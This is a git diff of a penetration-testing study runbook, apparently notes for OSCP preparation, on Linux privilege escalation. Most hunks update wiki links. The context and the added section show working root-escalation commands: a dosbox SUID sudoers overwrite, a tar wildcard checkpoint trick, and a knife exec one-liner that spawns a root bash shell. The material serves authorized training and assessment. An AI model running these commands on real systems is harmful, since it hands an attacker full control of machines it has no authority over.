@@ -89,7 +89,7 @@ flowchart TD
 → `dosbox -c 'mount c /etc' -c 'echo $Username ALL=(ALL) NOPASSWD: ALL > c:\sudoers' -c 'exit'`
 → Then `sudo -n bash`
 → Cleanup: restore `/etc/sudoers` from the package-manager cache
-→ See [[Linux Privilege Escalation#DOSBox SUID → Sudoers Write (non-GTFOBins pattern)|Command Appendix]], [[PrivEsc Linux - SUID]]
+→ See [[Linux Privilege Escalation#DOSBox SUID → Sudoers Write (non-GTFOBins pattern)|Command Appendix]], [[OSCP/RUNBOOK V2/Linux - SUID Check|PrivEsc Linux - SUID]]
 
 ## SUID binary source contains `gets()` and a nearby `program` string
 
@@ -364,7 +364,7 @@ The unquoted `*` expands filenames from CWD. Files named `--checkpoint=1` and `-
 
 **Gotcha:** `exec=privesc.sh` alone fails — use `exec=bash privesc.sh`. Cannot use absolute paths (slashes aren't valid in filenames).
 
-→ [[PrivEsc Linux - Tar Wildcard]] | [[Linux Privilege Escalation]] (Command Appendix)
+→ [[OSCP/RUNBOOK V2/Linux - Sudo Check|PrivEsc Linux - Tar Wildcard]] | [[Linux Privilege Escalation]] (Command Appendix)
 
 ---
 
@@ -437,7 +437,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 ## Related Modules
 
-- [[MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page
+- [[OSCP/MODULES/18. Linux Privilege Escalation]] -- module concepts used by this hub page
 
 ## Demonstrated in box write-ups
 
@@ -464,3 +464,19 @@ timer found
 ```
 
 The TartarSauce example is the reference implementation for this branch: `backuperer` created the archive as `onuma` and extracted it as root after a delay.
+
+## `sudo -l` allows `/usr/bin/knife`
+
+```text
+sudo -l shows: (root) NOPASSWD: /usr/bin/knife
+         ↓
+Confirm the installed binary and version
+         ↓
+Use Knife's Ruby evaluator through the exact sudo-approved path
+         ↓
+sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
+         ↓
+Run id and whoami, then clean down
+```
+
+The key point is the embedded interpreter, not a guessed command-line flag. See [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]], [[Linux - Sudo Check]], and [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/).
